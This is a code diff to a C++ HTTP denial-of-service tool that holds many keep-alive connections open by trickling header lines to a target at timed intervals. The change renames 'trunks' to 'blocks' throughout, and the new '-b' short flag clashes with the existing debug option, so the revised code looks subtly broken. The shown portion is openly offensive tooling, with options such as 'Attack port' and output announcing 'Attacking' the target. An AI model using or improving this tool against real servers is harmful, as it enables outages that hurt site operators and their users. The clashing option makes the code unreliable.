@@ -9,7 +9,7 @@ using namespace boost;
 using namespace asio;
 namespace po = boost::program_options;
 
-int concurrency, trunks, interval, expires;
+int concurrency, blocks, interval, expires;
 string dest, port, location;
 bool debug;
 
@@ -43,10 +43,10 @@ public:
 
 	void append() {
 		cout << format("[append] %1%->%2%") % id % count << endl;
-		*stream << format("X-Trunk: %1%\r\n") % count;
+		*stream << format("X-Block: %1%\r\n") % count;
 		stream->flush();
 
-		if (count < trunks) {
+		if (count < blocks) {
 			count++;
 			timer->expires_from_now(posix_time::seconds(interval));
 			timer->async_wait(bind(&Request::append, this));
@@ -99,8 +99,8 @@ int main(int argc, char *argv[]) {
 		("port,p", po::value<string>(&port)->default_value("80"), "Attack port")
 		("location,l", po::value<string>(&location)->default_value("/"), "Attack location")
 		("concurrency,c", po::value<int>(&concurrency)->default_value(20), "Concurrency requests")
-		("trunks,t", po::value<int>(&trunks)->default_value(10), "Trunks count")
-		("interval,i", po::value<int>(&interval)->default_value(5), "Interval between trunks")
+		("blocks,b", po::value<int>(&blocks)->default_value(10), "Blocks count")
+		("interval,i", po::value<int>(&interval)->default_value(5), "Interval between blocks")
 		("expires,e", po::value<int>(&expires)->default_value(5), "Expires for keep-alive connection")
 		("help,h", "Show this help info")
 		("debug,b", "Display response from server for debug");
@@ -128,7 +128,7 @@ int main(int argc, char *argv[]) {
 	io_service io;
 	deadline_timer timer(io);
 
-	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, trunks=%5%, interval=%6%, expires=%7%, debug=%8%") % dest % port % location % concurrency % trunks % interval % expires % debug << endl << endl;
+	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, blocks=%5%, interval=%6%, expires=%7%, debug=%8%") % dest % port % location % concurrency % blocks % interval % expires % debug << endl << endl;
 
 	requestFactory(&io, &timer, 0);
 	io.run();
